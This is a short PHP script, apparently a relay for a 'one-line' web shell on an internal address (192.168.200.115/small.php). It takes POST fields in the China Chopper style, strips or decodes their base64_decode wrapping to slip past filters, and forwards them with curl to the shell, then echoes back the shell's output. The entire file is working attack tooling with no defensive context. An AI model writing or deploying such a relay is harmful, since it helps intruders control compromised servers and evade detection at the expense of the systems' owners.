<?php
$target="http://192.168.200.115/small.php";//这个就是前面那个一句话的地址
$poststr='';
$i=0;
foreach($_POST as $k=>$v)
{
  if(strstr($v, "base64_decode"))
  {
    $v=str_replace("base64_decode(","",$v);
    $v=str_replace("))",")",$v);
  }
  else
  {
    if($k==="z0")
      $v=base64_decode($v);
  }
  $pp=$k."=".urlencode($v);
  //echo($pp);
  if($i!=0)
  {
    $poststr=$poststr."&".$pp;
  }
  else
  {  
    $poststr=$pp;
  }
  $i=$i+1;
}
$ch = curl_init();
$curl_url = $target."?".$_SERVER['QUERY_STRING'];
curl_setopt($ch, CURLOPT_URL, $curl_url);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $poststr);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
curl_close($ch);
echo $result;
?>